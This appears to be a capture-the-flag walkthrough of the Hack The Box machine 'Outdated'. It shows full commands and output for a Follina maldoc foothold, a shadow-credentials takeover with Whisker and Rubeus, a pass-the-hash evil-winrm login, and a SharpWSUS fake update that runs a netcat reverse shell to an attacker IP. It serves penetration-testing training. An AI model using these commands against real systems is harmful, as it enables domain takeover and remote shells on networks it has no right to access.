## Outdated

### Lab Details 

- Difficulty: Medium
- Type: Enumerate SMB, SMTP, Bloodhound, Golden Ticket, AD WSUS, Priv Esc, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-19 02:43:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-19T02:45:20+00:00; +59m59s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-09-19T02:29:09
|_Not valid after:  2026-09-19T02:29:09
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-19T02:45:20+00:00; +59m59s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-09-19T02:29:09
|_Not valid after:  2026-09-19T02:29:09
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-19T02:45:20+00:00; +59m59s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-09-19T02:29:09
|_Not valid after:  2026-09-19T02:29:09
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-09-19T02:29:09
|_Not valid after:  2026-09-19T02:29:09
|_ssl-date: 2025-09-19T02:45:20+00:00; +59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8530/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
```
#### Initial Foothold 
![[enum smb.png]]
![[pdf file.png]]
```
itsupport@outdated.htb
```
- searching the CVEs above and found one with POC
- clone the repo 
```bash
git clone https://github.com/JohnHammond/msdt-follina
```
- need to modify the script since the target has no access to external network
![[modify follina.png]]
- set up python http server to serve the `nc64.exe`
```bash
./follina.py -i tun0 -r 4444 -p 80
[+] copied staging doc /tmp/km_3r1lq
[+] created maldoc ./follina.doc
[+] serving html payload on :80
[+] starting 'nc -lvnp 4444' 
listening on [any] 4444 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.229.239] 49885
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\btables\AppData\Local\Temp\SDIAG_ee221b33-d4e1-4687-bd7b-dcb13d86720a> whoami 
outdated\btables
```

#### Lateral Movement (If any)
- load `SharpHound.exe` and run
- then get the `.zip` file from target to host
```bash
## on attacker
impacket-smbserver share . -smb2support -user user -password pass

## on user
net use z: \\10.10.14.5\share /user:user pass
copy 20221108140327_BloodHound.zip z:
```
- unzip the output file and load it into data ingest
- run the `short path to systems trusted for unconstrained delegation`
- and we see that the group user `btables` belongs to has `AddKeyCredentialLink` access over user `sflowers`
![[bloodhound.png]]
- follow this [blog](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) to perform lateral movement to user `sflowers`
```bash
PS C:\Users\btables> Invoke-Whisker -command "add /target:sflowers"
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password Dv6XKZLNwM8DWC5M
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredenhttps://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566abtial
[*] KeyCredential generated with DeviceID b69cc640-9ca1-4bfb-80a0-01a169dc1e60
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/<SNIP>
```
- the output shows that we can add  use `Rubeus` to get us the TGT of that same user
- load `Rubeus` and execute the command from output but first we need to remove all the line breaks, I've used this [site](https://pinetools.com/remove-line-breaks) and select remove all line breaks
- after executing the command we get the `NTLM` of user `sflowers` 
- use `evil-winrm` 
```bash
 evil-winrm -i 10.129.229.239 -u sflowers@outdated.htb -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sflowers\Documents> 
```
#### Privilege Escalation
- check group permission we find that the user belongs to 
```bash
*Evil-WinRM* PS C:\Users\sflowers\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ===============================================================
<SNIP>
OUTDATED\WSUS Administrators                Alias            S-1-5-21-4089647348-67660539-4016542185-1000 Mandatory group, Enabled by default, Enabled group, Local Group
```
- check if `WSUS` is running
```bash
*Evil-WinRM* PS C:\Users\sflowers\Desktop> reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    SetActiveHours    REG_DWORD    0x1
    ActiveHoursStart    REG_DWORD    0x0
    ActiveHoursEnd    REG_DWORD    0x17
    AcceptTrustedPublisherCerts    REG_DWORD    0x1
    ExcludeWUDriversInQualityUpdate    REG_DWORD    0x1
    DoNotConnectToWindowsUpdateInternetLocations    REG_DWORD    0x1
    WUServer    REG_SZ    http://wsus.outdated.htb:8530
    WUStatusServer    REG_SZ    http://wsus.outdated.htb:8530
    UpdateServiceUrlAlternate    REG_SZ

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
*Evil-WinRM* PS C:\Users\sflowers\Desktop> reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
    AutoInstallMinorUpdates    REG_DWORD    0x1
    NoAutoUpdate    REG_DWORD    0x0
    AUOptions    REG_DWORD    0x3
    ScheduledInstallDay    REG_DWORD    0x0
    ScheduledInstallTime    REG_DWORD    0x3
    ScheduledInstallEveryWeek    REG_DWORD    0x1
    UseWUServer    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU\NoAutoUpdate
```
- we can see the server running on non-SSL HTTP, under the domain `wsus.outdated.htb`
- followed this [blog](https://www.lrqa.com/en/cyber-labs/introducing-sharpwsus/) to perform privilege escalation with `SharpWSUS`
- get the executable [here](https://github.com/Ch4os1/SharpWSUS)
- NOTE: switch to `cmd` instead of `evil-winrm` for stability 
- create the patch using `SharpWSUS`
```powershell
C:\Users\sflowers\Desktop>.\SharpWSUS.exe create /payload:"C:\users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.54 9001" /title:"pwned"
 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PsExec64.exe
[*] Payload Path: C:\users\sflowers\Desktop\PsExec64.exe
[*] Arguments: -accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.54 9001
[*] Arguments (HTML Encoded): -accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.54 9001

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 30
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 31
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:23e19a16-aedb-441f-8180-35ad5ed5be8c /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:23e19a16-aedb-441f-8180-35ad5ed5be8c /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:23e19a16-aedb-441f-8180-35ad5ed5be8c /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete
```
- approve the batch  
```powershell
C:\Users\sflowers\Desktop>.\SharpWSUS.exe approve /updateid:23e19a16-aedb-441f-8180-35ad5ed5be8c /computername:dc.outdated.htb /groupname:"pwned"
.\SharpWSUS.exe approve /updateid:23e19a16-aedb-441f-8180-35ad5ed5be8c /computername:dc.outdated.htb /groupname:"pwned"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
Group Exists = False
Group Created: pwned
Added Computer To Group
Approved Update

[*] Approve complete
```
- wait for couple minute to receive a reverse shell
```bash
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.229.239] 55220
Microsoft Windows [Version 10.0.17763.1432]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
#### Resources

#### Lesson Learned
